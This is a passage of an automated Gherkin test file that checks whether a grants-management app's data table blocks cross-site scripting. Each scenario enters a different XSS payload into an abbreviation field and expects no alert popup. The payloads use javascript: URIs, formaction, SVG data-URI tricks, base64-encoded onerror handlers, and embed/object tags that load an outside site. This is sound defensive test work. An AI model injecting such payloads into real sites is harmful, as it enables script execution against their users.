      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                    | Field                |
      | <script>import('data:text/javascript,alert(1)')</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301020 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                           | Field                |
      | <base href="javascript:/a/-alert(1)///////"><a href=../lol/safari.html>test</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301022 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                    | Field                |
      | <math><x href="javascript:alert(1)">blah | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301024 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                            | Field                |
      | <form><button formaction=javascript:alert(1)>XSS | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301026 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                              | Field                |
      | <form><input type=submit formaction=javascript:alert(1) value=XSS> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301027 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                          | Field                |
      | <form action=javascript:alert(1)><input type=submit value=XSS> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301030 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                          | Field                |
      | <form action=javascript:alert(1)><input type=submit value=XSS> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301036 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                      | Field                |
      | <a href="javascript://%0aalert(1)">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301027 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                                                                                          | Field                |
      | <svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x" /></svg> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301039 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                 | Field                |
      | <svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" /> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301042 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                        | Field                |
      | <svg><animate xlink:href="#x" attributeName="href" values="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" /><use id=x /> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301047 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                         | Field                |
      | <embed code=https://portswigger-labs.net width=500 height=500 type=text/html> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301053 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                           | Field                |
      | <object width=500 height=500 type=text/html><param name=url value=https://portswigger-labs.net> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301058 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                            | Field                |
      | <object width=500 height=500 type=text/html><param name=code value=https://portswigger-labs.net> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301060 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                             | Field                |
      | <object width=500 height=500 type=text/html><param name=movie value=https://portswigger-labs.net> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301061 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                           | Field                |
      | <object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301063 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                           | Field                |
      | <object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301064 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
